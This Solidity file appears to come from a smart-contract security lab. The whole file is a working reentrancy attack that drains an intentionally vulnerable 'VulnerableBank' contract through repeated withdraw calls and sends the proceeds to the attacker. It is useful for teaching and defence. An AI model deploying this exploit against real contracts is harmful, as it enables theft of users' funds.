// attacks/AttackReentrancy.sol
pragma solidity ^0.8.0;

import "../contracts/VulnerableBank.sol";

contract AttackReentrancy {
    VulnerableBank public bank;
    address public attacker;
    uint256 public attackCount;
    
    event AttackRound(uint256 round, uint256 amount);
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        attacker = msg.sender;
    }
    
    // استقبال الأموال وتنفيذ الهجوم المتكرر
    receive() external payable {
        attackCount++;
        emit AttackRound(attackCount, msg.value);
        
        // نكرر الهجوم 5 مرات
        if (attackCount < 5) {
            uint256 amount = bank.balances(address(this));
            if (amount > 0) {
                bank.withdraw(amount);
            }
        }
    }
    
    // بدء الهجوم
    function attack() public payable {
        require(msg.value == 1 ether, "Send exactly 1 ETH");
        
        // 1. إيداع الأموال في البنك
        bank.deposit{value: 1 ether}();
        
        // 2. بدء سحب الأموال (سيتم استدعاء receive() )
        bank.withdraw(1 ether);
    }
    
    // سحب الأرباح
    function withdraw() public {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);
    }
    
    // التحقق من الرصيد
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
